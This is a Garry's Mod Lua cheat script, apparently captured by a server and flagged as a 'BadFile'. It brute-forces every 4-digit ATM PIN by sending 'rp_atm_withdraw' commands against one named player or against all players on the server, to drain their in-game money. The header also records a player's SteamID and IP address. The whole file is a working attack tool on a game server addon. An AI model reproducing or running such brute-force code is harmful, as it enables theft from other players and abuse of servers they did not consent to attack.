--[[
	MOD/lua/T7/T7Force.lua
	special hed :: The Odyssey | STEAM_0:1:59601079 <184.15.7.53:27005> | [26-11-13 04:05:58AM]
	===BadFile===
]]

--[[                 ATM Bruteforcer                       ]]--

local Break = 0

local function BruteForce()
	local PinTable = {}
	for i = 0, 9 do
		table.insert( PinTable, "000"..i )
	end
	for i = 10, 99 do
	 	table.insert( PinTable, "00".. i )
	 end 
	for i = 100, 999 do
		table.insert( PinTable, "0"..i )
	end
	for i = 1000, 9999 do
		table.insert( PinTable, i )
	end

local function BruteForceAll( ply, cmd , args )
	MsgC( Color( 0, 255, 0 ), "\nBruteForcing..\n" )
	for k,v in pairs(player.GetAll()) do
		for _, Pin in pairs(PinTable) do
			timer.Simple(tonumber(Pin)*.15, function()
				RunConsoleCommand( "rp_atm_withdraw", util.CRC(Pin), v:UniqueID(), args[1] )
				if Break == 1 then
					Break = 0
					return
				end
			end )
		end
	end
end

local function BruteForcePly( ply, cmd, args )
	MsgC(Color( 0, 255, 0 ), "\nBruteForcing..\n")
	for k,v in pairs(player.GetAll()) do
		if string.find(string.lower(v:Name()), string.lower(args[1])) then
			for _, Pin in pairs(PinTable) do
				timer.Simple(tonumber(Pin)*.01, function()
					MsgC(Color( 0, 255, 0 ), "\nChecking: "..Pin.."\n")
					RunConsoleCommand( "rp_atm_withdraw", util.CRC(Pin), v:UniqueID(), args[2] )
					if Break == 1 then
						Break = 0
						return
					end
				end )
			end
		end
	end
end

concommand.Add("T7_ATMBruteForce_All", BruteForceAll)
concommand.Add("T7_ATMBruteForce_Ply", BruteForcePly)

MsgC(Color( 0, 255, 0 ), "\nInitialized!\n")

end

concommand.Add("T7_ATMBruteForce", BruteForce)

MsgC(Color( 0, 255, 0 ), "\nT7 ATM BruteForcer Initialized!\n")